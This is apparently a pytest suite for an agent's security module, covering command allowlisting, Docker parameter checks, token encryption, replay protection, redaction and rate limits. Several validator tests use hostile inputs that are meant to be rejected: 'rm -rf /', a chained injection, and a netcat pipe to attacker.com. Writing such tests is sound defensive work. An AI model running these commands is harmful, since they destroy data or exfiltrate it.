"""Tests for agent security module.

Tests command validation, Docker parameter validation, token encryption,
replay protection, and other security features.
"""

import time

import pytest
from unittest.mock import patch

from lib.validation import (
    validate_command,
    validate_docker_params,
)
from lib.encryption import (
    TokenEncryption,
)
from lib.replay import (
    ReplayProtection,
)
from lib.redact import redact_sensitive_data
from lib.permissions import (
    PermissionLevel,
    get_method_permission,
)
from lib.rate_limiter import (
    CommandRateLimiter,
)


class TestCommandValidator:
    """Tests for command allowlist validation."""

    def test_allows_docker_ps(self):
        """Should allow docker ps command."""
        is_valid, _ = validate_command("docker ps")
        assert is_valid is True

    def test_allows_docker_ps_with_format(self):
        """Should allow docker ps with format option."""
        is_valid, _ = validate_command("docker ps --format '{{.ID}}'")
        assert is_valid is True

    def test_allows_docker_version(self):
        """Should allow docker version command."""
        is_valid, _ = validate_command("docker version")
        assert is_valid is True

    def test_allows_docker_info(self):
        """Should allow docker info command."""
        is_valid, _ = validate_command("docker info")
        assert is_valid is True

    def test_allows_uname(self):
        """Should allow uname command."""
        is_valid, _ = validate_command("uname -a")
        assert is_valid is True

    def test_allows_hostname(self):
        """Should allow hostname command."""
        is_valid, _ = validate_command("hostname")
        assert is_valid is True

    def test_allows_uptime(self):
        """Should allow uptime command."""
        is_valid, _ = validate_command("uptime")
        assert is_valid is True

    def test_allows_df(self):
        """Should allow df -h command."""
        # df -h matches pre-flight checks pattern with max_timeout=30
        is_valid, _ = validate_command("df -h", timeout=30)
        assert is_valid is True

    def test_allows_free(self):
        """Should allow free command."""
        # free -h matches pre-flight checks pattern with max_timeout=30
        is_valid, _ = validate_command("free -h", timeout=30)
        assert is_valid is True

    def test_rejects_arbitrary_command(self):
        """Should reject arbitrary commands."""
        is_valid, error = validate_command("rm -rf /")
        assert is_valid is False
        assert "not in allowlist" in error

    def test_rejects_shell_injection(self):
        """Should reject shell injection attempts."""
        is_valid, _ = validate_command("docker ps; rm -rf /")
        assert is_valid is False

    def test_rejects_command_substitution(self):
        """Should reject command substitution."""
        is_valid, _ = validate_command("docker ps $(whoami)")
        assert is_valid is False

    def test_rejects_pipe_injection(self):
        """Should reject pipe injection."""
        is_valid, _ = validate_command("docker ps | nc attacker.com 1234")
        assert is_valid is False

    def test_enforces_timeout_limit(self):
        """Should enforce per-command timeout limits."""
        # Pull job status check has max_timeout of 10s
        is_valid, error = validate_command(
            "cat /tmp/pull-job-abcd1234/status", timeout=60
        )
        assert is_valid is False
        assert "exceeds maximum" in error

    def test_allows_within_timeout_limit(self):
        """Should allow commands within timeout limit."""
        is_valid, _ = validate_command(
            "cat /tmp/pull-job-abcd1234-5678-90ab-cdef/status", timeout=5
        )
        assert is_valid is True


class TestDockerParamValidation:
    """Tests for Docker container parameter validation."""

    def test_allows_normal_container(self):
        """Should allow normal container parameters."""
        params = {
            "volumes": {
                "/app/data": {"bind": "/data", "mode": "rw"},
            },
        }
        is_valid, _ = validate_docker_params(params)
        assert is_valid is True

    def test_blocks_privileged_mode(self):
        """Should block privileged containers."""
        params = {"privileged": True}
        is_valid, error = validate_docker_params(params)
        assert is_valid is False
        assert "Privileged" in error

    def test_blocks_dangerous_capabilities(self):
        """Should block dangerous capabilities."""
        for cap in ["ALL", "SYS_ADMIN", "SYS_PTRACE", "SYS_RAWIO"]:
            params = {"cap_add": [cap]}
            is_valid, error = validate_docker_params(params)
            assert is_valid is False
            assert cap in error

    def test_blocks_host_pid_mode(self):
        """Should block host PID namespace."""
        params = {"pid_mode": "host"}
        is_valid, error = validate_docker_params(params)
        assert is_valid is False
        assert "pid_mode" in error

    def test_blocks_host_network_mode(self):
        """Should block host network mode."""
        params = {"network_mode": "host"}
        is_valid, error = validate_docker_params(params)
        assert is_valid is False
        assert "network_mode" in error

    def test_blocks_docker_socket_mount(self):
        """Should block Docker socket mount."""
        params = {
            "volumes": {
                "/var/run/docker.sock": {"bind": "/var/run/docker.sock"},
            },
        }
        is_valid, error = validate_docker_params(params)
        assert is_valid is False
        # Error message mentions the path being blocked
        assert "/var/run/docker.sock" in error or "docker.sock" in error.lower()

    def test_blocks_protected_path_write(self):
        """Should block write access to protected paths."""
        protected_paths = ["/", "/etc", "/var", "/usr", "/bin", "/root"]
        for path in protected_paths:
            params = {
                "volumes": {
                    path: {"bind": "/mnt", "mode": "rw"},
                },
            }
            is_valid, error = validate_docker_params(params)
            assert is_valid is False
            assert "not allowed" in error

    def test_allows_protected_path_readonly(self):
        """Should allow read-only access to some paths."""
        # Read-only is allowed for app purposes
        params = {
            "volumes": {
                "/etc/localtime": {"bind": "/etc/localtime", "mode": "ro"},
            },
        }
        is_valid, _ = validate_docker_params(params)
        # Root paths are blocked even for read
        # The current implementation blocks all access to protected paths with rw
        # This test verifies readonly is handled correctly
        assert is_valid is True


class TestTokenEncryption:
    """Tests for token encryption at rest."""

    @pytest.fixture
    def encryption(self, tmp_path):
        """Create TokenEncryption with temp salt file."""
        with patch.object(TokenEncryption, "SALT_FILE", str(tmp_path / ".token_salt")):
            yield TokenEncryption()

    def test_encrypt_decrypt_roundtrip(self, encryption):
        """Should encrypt and decrypt token correctly."""
        original = "secret-token-12345"
        encrypted = encryption.encrypt(original)
        decrypted = encryption.decrypt(encrypted)
        assert decrypted == original

    def test_encrypted_differs_from_original(self, encryption):
        """Encrypted token should differ from original."""
        original = "secret-token-12345"
        encrypted = encryption.encrypt(original)
        assert encrypted != original

    def test_encryption_is_deterministic_with_same_key(self, encryption):
        """Same token encrypts differently each time (Fernet uses timestamps)."""
        original = "secret-token-12345"
        encrypted1 = encryption.encrypt(original)
        encrypted2 = encryption.encrypt(original)
        # Fernet encryption includes timestamp, so they differ
        assert encrypted1 != encrypted2

    def test_decrypt_invalid_token_raises(self, encryption):
        """Should raise on invalid encrypted token."""
        with pytest.raises(Exception):
            encryption.decrypt("not-valid-encrypted-data")


class TestReplayProtection:
    """Tests for message replay protection."""

    @pytest.fixture
    def protection(self):
        """Create fresh ReplayProtection instance."""
        return ReplayProtection()

    def test_accepts_fresh_message(self, protection):
        """Should accept fresh message with new nonce."""
        nonce = protection.generate_nonce()
        timestamp = time.time()
        is_valid, _ = protection.validate_message(timestamp, nonce)
        assert is_valid is True

    def test_rejects_duplicate_nonce(self, protection):
        """Should reject message with duplicate nonce."""
        nonce = protection.generate_nonce()
        timestamp = time.time()

        # First message accepted
        is_valid, _ = protection.validate_message(timestamp, nonce)
        assert is_valid is True

        # Replay rejected
        is_valid, error = protection.validate_message(timestamp, nonce)
        assert is_valid is False
        assert "replay" in error.lower()

    def test_rejects_old_message(self, protection):
        """Should reject old messages."""
        nonce = protection.generate_nonce()
        old_timestamp = time.time() - 400  # 6+ minutes ago

        is_valid, error = protection.validate_message(old_timestamp, nonce)
        assert is_valid is False
        assert "old" in error.lower()

    def test_rejects_future_message(self, protection):
        """Should reject messages from future."""
        nonce = protection.generate_nonce()
        future_timestamp = time.time() + 60  # 1 minute in future

        is_valid, error = protection.validate_message(future_timestamp, nonce)
        assert is_valid is False
        assert "future" in error.lower()

    def test_generates_unique_nonces(self, protection):
        """Should generate unique nonces."""
        nonces = {protection.generate_nonce() for _ in range(100)}
        assert len(nonces) == 100


class TestSensitiveDataRedaction:
    """Tests for sensitive data redaction in logs."""

    def test_redacts_token(self):
        """Should redact token values."""
        data = {"token": "secret123", "other": "value"}
        result = redact_sensitive_data(data)
        assert result["token"] == "[REDACTED]"
        assert result["other"] == "value"

    def test_redacts_password(self):
        """Should redact password values."""
        data = {"password": "secret", "username": "user"}
        result = redact_sensitive_data(data)
        assert result["password"] == "[REDACTED]"
        assert result["username"] == "user"

    def test_redacts_api_key(self):
        """Should redact API key values."""
        data = {"api_key": "key123", "endpoint": "/api"}
        result = redact_sensitive_data(data)
        assert result["api_key"] == "[REDACTED]"
        assert result["endpoint"] == "/api"

    def test_redacts_nested_secrets(self):
        """Should redact secrets in nested structures."""
        data = {
            "config": {
                "database": {
                    "password": "dbpass",
                    "host": "localhost",
                },
            },
        }
        result = redact_sensitive_data(data)
        assert result["config"]["database"]["password"] == "[REDACTED]"
        assert result["config"]["database"]["host"] == "localhost"

    def test_handles_list_values(self):
        """Should handle list values correctly."""
        data = {
            "items": [
                {"token": "secret1"},
                {"token": "secret2"},
            ],
        }
        result = redact_sensitive_data(data)
        assert result["items"][0]["token"] == "[REDACTED]"
        assert result["items"][1]["token"] == "[REDACTED]"


class TestPermissionLevels:
    """Tests for RPC method permission levels."""

    def test_system_info_is_read(self):
        """System info should be READ permission."""
        assert get_method_permission("system.info") == PermissionLevel.READ

    def test_system_exec_is_admin(self):
        """System exec should be ADMIN permission."""
        assert get_method_permission("system.exec") == PermissionLevel.ADMIN

    def test_docker_start_is_execute(self):
        """Docker start should be EXECUTE permission."""
        assert (
            get_method_permission("docker.containers.start") == PermissionLevel.EXECUTE
        )

    def test_unknown_method_defaults_to_admin(self):
        """Unknown methods should default to ADMIN."""
        assert get_method_permission("unknown.method") == PermissionLevel.ADMIN


class TestCommandRateLimiter:
    """Tests for command execution rate limiting."""

    def test_allows_commands_within_limit(self):
        """Should allow commands within rate limit."""
        limiter = CommandRateLimiter(max_commands_per_minute=10, max_concurrent=5)

        for _ in range(5):
            allowed, _ = limiter.acquire()
            assert allowed is True
            limiter.release()

    def test_blocks_excess_concurrent(self):
        """Should block when too many concurrent commands."""
        limiter = CommandRateLimiter(max_commands_per_minute=100, max_concurrent=2)

        # Acquire 2 slots
        limiter.acquire()
        limiter.acquire()

        # Third should be blocked
        allowed, error = limiter.acquire()
        assert allowed is False
        assert "concurrent" in error.lower()

    def test_blocks_rate_limit_exceeded(self):
        """Should block when rate limit exceeded."""
        limiter = CommandRateLimiter(max_commands_per_minute=3, max_concurrent=10)

        # Use up the rate limit
        for _ in range(3):
            limiter.acquire()
            limiter.release()

        # Next should be blocked
        allowed, error = limiter.acquire()
        assert allowed is False
        assert "rate limit" in error.lower()

    def test_release_allows_more_concurrent(self):
        """Releasing should allow more concurrent commands."""
        limiter = CommandRateLimiter(max_commands_per_minute=100, max_concurrent=1)

        limiter.acquire()

        # Blocked
        allowed, _ = limiter.acquire()
        assert allowed is False

        # Release
        limiter.release()

        # Now allowed
        allowed, _ = limiter.acquire()
        assert allowed is True
